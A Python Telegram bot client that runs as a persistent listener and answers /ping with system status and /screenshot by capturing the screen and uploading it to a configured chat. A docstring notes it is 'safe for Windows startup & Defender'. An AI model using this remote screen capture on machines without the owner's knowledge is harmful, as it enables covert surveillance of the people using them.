# telegram_client.py

import requests
import time
from logger import setup_logger
from system_status import get_status_text
from screenshot import capture_screenshot
import os
from config_loader import load_config

CONFIG = load_config()

TELEGRAM_BOT_TOKEN = CONFIG["telegram"]["bot_token"]
TELEGRAM_CHAT_ID = CONFIG["telegram"]["chat_id"]
REQUEST_TIMEOUT = 10
logger = setup_logger()


class TelegramClient:
    def __init__(self):
        self.base_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
        self.offset = self._get_latest_update_id()

    def _get_latest_update_id(self):
        try:
            response = requests.get(
                f"{self.base_url}/getUpdates",
                timeout=REQUEST_TIMEOUT
            )
            response.raise_for_status()
            updates = response.json().get("result", [])
            if updates:
                return updates[-1]["update_id"] + 1
        except Exception:
            pass
        return None

    def send_message(self, text: str, retries=3, delay=5) -> bool:
        url = f"{self.base_url}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }

        for attempt in range(1, retries + 1):
            try:
                response = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
                response.raise_for_status()
                logger.info("Telegram message sent")
                return True
            except requests.RequestException as e:
                logger.warning(f"Telegram send attempt {attempt} failed: {e}")
                time.sleep(delay)

        logger.error("All Telegram send attempts failed")
        return False

    def listen_forever(self):
        """
        Persistent Telegram command listener.
        Safe for Windows startup & Defender.
        """
        logger.info("Entering persistent Telegram listener")

        while True:
            try:
                response = requests.get(
                    f"{self.base_url}/getUpdates",
                    params={"timeout": 30, "offset": self.offset},
                    timeout=REQUEST_TIMEOUT + 20
                )
                response.raise_for_status()
                updates = response.json().get("result", [])

                for update in updates:
                    self.offset = update["update_id"] + 1
                    text = update.get("message", {}).get("text", "").strip()

                    if text == "/ping":
                        logger.info("/ping command received")
                        self.send_message(get_status_text())

                    elif text == "/screenshot":
                        logger.info("/screenshot command received")
                        from screenshot import capture_screenshot
                        import os

                        path = capture_screenshot()
                        if path:
                            self.send_photo(path, caption="🖥 Current Screen")
                            try:
                                os.remove(path)
                            except Exception:
                                pass
                        else:
                            self.send_message("❌ Screenshot failed")

            except requests.exceptions.ReadTimeout:
                logger.warning("Telegram long-poll timeout (expected)")
            except Exception as e:
                logger.error(f"Listener error: {e}")

            # Small sleep to avoid tight loop
            time.sleep(2)

    def send_photo(self, photo_path: str, caption: str = "") -> bool:
        url = f"{self.base_url}/sendPhoto"

        try:
            with open(photo_path, "rb") as photo:
                files = {"photo": photo}
                data = {
                    "chat_id": TELEGRAM_CHAT_ID,
                    "caption": caption
                }

                response = requests.post(
                    url,
                    files=files,
                    data=data,
                    timeout=REQUEST_TIMEOUT
                )
                response.raise_for_status()

            logger.info("Screenshot sent successfully")
            return True

        except Exception as e:
            logger.error(f"Failed to send screenshot: {e}")
            return False

